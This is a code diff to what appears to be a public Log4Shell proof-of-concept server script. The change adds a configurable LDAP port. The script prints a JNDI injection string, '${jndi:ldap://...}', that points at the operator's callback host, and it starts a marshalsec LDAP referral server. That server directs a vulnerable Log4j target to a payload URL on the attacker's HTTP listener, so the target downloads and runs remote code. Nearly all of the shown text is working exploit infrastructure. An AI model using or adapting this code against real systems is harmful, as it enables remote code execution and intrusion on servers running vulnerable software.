@@ -11,22 +11,23 @@ log.info("Log4Shell POC server")
 log.info("By: serialwaffle")
 log.info("https://github.com/serialwaffle/l4j_server")
 
-if len(sys.argv) != 3:
+if len(sys.argv) != 4:
 	log.info("Duh, your not using me right....")
-	print("\n python3 log4j_server.py <callback_ip:callback_port> <HTTP_server_port> \n")
+	print("\n python3 log4j_server.py <callback_ip:callback_port> <HTTP_server_port> <LDAP_server_port\n")
 	exit()
 
 
 try:
 	lsocket = sys.argv[1] 
 	webport = sys.argv[2]
+	ldapport = sys.argv[3]
 	lport = lsocket.split(":",1)[1]
 	lip = lsocket.split(":",1)[0]
 	log.info("Exploit Exploit calling back to: "+lip+":"+lport)
 	log.info("HTTP Listener on : "+webport)
 except:
 	log.info("Duh, your not using me right....")
-	print("\n python3 log4j_Server.py <callback_ip:callback_port> <HTTP_server_port> \n")
+	print("\n python3 log4j_Server.py <callback_ip:callback_port> <HTTP_server_port> <LDAP_server_port\n")
 	exit()
 
 
@@ -64,11 +65,11 @@ def HTTPSvr():
     httpd.serve_forever()
 
 def LDAPSvr():
-	exploit = "${jndi:ldap://%s:1389/a}"%(lip)
+	exploit = "${jndi:ldap://%s:%s/a}"%(lip,ldapport)
 	log.info("*****EXPLOIT****")
 	print("\n\n"+exploit+"\n\n")
 	url = ("http://%s:%s/#payload")%(lip,webport)
-	subprocess.run([java_path,"-cp",marshal_path,marshal_bin,url,])
+	subprocess.run([java_path,"-cp",marshal_path,marshal_bin,url,ldapport])
 
 
 
